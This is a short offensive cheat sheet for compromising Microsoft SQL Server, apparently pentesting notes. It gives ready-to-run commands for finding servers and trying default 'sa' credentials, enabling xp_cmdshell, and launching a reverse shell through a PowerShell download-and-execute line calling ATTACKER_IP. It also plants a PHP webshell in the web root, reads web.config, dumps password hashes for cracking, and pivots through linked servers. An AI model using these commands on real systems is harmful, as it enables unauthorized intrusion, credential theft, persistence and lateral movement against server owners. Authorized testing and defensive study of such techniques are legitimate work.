# MSSQL Exploitation

## Detection & Access
```bash
# Find MSSQL servers
nmap -p1433 --open 10.10.10.0/24

# Test default credentials
impacket-mssqlclient sa@TARGET
impacket-mssqlclient sa:sa@TARGET

# With domain credentials
impacket-mssqlclient DOMAIN/USERNAME:PASSWORD@TARGET
```

## Database Enumeration

```sql
# After connecting
SELECT @@version;
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;

# Get users
SELECT name FROM sys.syslogins;

# Check if you're sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Command Execution via xp_cmdshell

```sql
# Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';

# Get reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
```

## File Operations

```sql
# Read files
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';

# Create webshell
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

## Hash Extraction

```sql
# Dump SQL Server hashes
SELECT name, password_hash FROM sys.sql_logins;

# These are MSSQL hashes (hashcat mode 1731)
```

## Linked Servers

```sql
# Find linked servers (pivot opportunity)
EXEC sp_linkedservers;

# Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```
